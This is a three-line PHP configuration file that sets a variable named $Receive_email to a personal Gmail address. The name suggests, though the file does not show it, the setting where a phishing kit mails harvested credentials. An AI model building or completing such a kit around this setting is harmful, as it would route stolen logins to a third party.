<?php 
$Receive_email="banbodudu@gmail.com";
?>